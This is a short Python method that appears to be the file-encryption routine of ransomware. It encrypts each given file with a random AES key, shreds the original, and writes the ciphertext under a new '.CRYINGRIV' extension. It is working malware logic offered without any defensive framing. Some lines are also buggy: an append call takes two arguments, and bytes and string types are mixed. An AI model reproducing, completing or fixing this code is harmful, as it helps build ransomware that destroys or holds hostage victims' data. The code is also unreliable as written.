def encryption(self, files):
		if not files:
			print("No files included")
			return None

		key_and_base64_path = []

		for file in files:
			# Generates a random 128-bit key, encrypted in base64
			key = generate_randomKey(128, True)
			# Generates a cryptographic key figure
			AES_obj = AESHash(key)
			# Decodes the base64-decoded file
			file = base64.b64decode(file)
			# Checks the contents of the file
			with open(file, 'rb') as f:
				content = f.read()
			# Encrypts the contents of the file with the generated random key
			encrypted = AES_obj.encrypt(content)
			self.shred(file)
			# Adds an encryption identification extension to the file name
			new_name = file + ".CRYINGRIV"

			# inserts the encrypted file
			with open(new_name, 'wb') as f:
				f.write(encrypted)
			key_and_base64_path.append(key, base64.b64encode(new_name))

		return key_and_base64_path